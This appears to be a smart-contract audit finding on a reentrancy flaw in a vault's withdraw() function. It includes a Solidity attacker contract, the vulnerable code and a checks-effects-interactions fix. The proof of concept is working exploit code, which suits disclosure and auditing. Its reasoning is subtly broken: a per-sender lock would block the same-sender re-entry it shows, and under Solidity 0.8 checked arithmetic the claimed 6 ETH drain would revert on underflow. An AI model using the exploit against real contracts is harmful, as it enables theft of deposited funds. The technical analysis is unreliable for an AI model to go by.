# H-02: Reentrancy in withdraw() allows stealing funds before balance update

## Severity: High

## Lines of code
https://github.com/Blueberry-protocol/blueberry-core/blob/main/contracts/Vault.sol#L203-L245

## Vulnerability details

### Impact

The `withdraw()` function in `Vault.sol` transfers ETH to the caller before updating the internal accounting. A malicious contract can re-enter `withdraw()` in its `receive()` function to drain the vault. An attacker with a 1 ETH deposit can drain the entire vault balance.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyAttacker {
    IVault public vault;
    uint256 public attackCount;

    constructor(IVault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    receive() external payable {
        if (attackCount < 5 && address(vault).balance >= 1 ether) {
            attackCount++;
            vault.withdraw(1 ether); // re-enter before balance updated
        }
    }
}
```

The attacker deposits 1 ETH, calls `withdraw(1 ether)`, and re-enters 5 times before `userBalances[msg.sender]` is set to 0, draining 6 ETH total.

### Root cause

Classic checks-effects-interactions violation:

```solidity
// Vault.sol line 203 — VULNERABLE
function withdraw(uint256 amount) external nonReentrant {
    require(userBalances[msg.sender] >= amount, "insufficient balance");

    // WRONG ORDER: transfer before state update
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "ETH transfer failed");

    // State update happens AFTER external call — re-entrancy window here
    userBalances[msg.sender] -= amount;
    totalDeposits -= amount;

    emit Withdrawal(msg.sender, amount);
}
```

Note: `nonReentrant` modifier is present but comes from a custom implementation that uses a `locked` flag stored in a mapping keyed by `msg.sender`, not a global lock — so cross-function reentrancy is not protected.

### Recommended Mitigation

Apply checks-effects-interactions pattern:

```solidity
function withdraw(uint256 amount) external nonReentrant {
    require(userBalances[msg.sender] >= amount, "insufficient balance");

    // Effects first
    userBalances[msg.sender] -= amount;
    totalDeposits -= amount;

    // Interactions last
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "ETH transfer failed");

    emit Withdrawal(msg.sender, amount);
}
```

Also replace custom reentrancy guard with OpenZeppelin's `ReentrancyGuard`.

## Tools used
Slither, Manual review

## Assessed type
Reentrancy
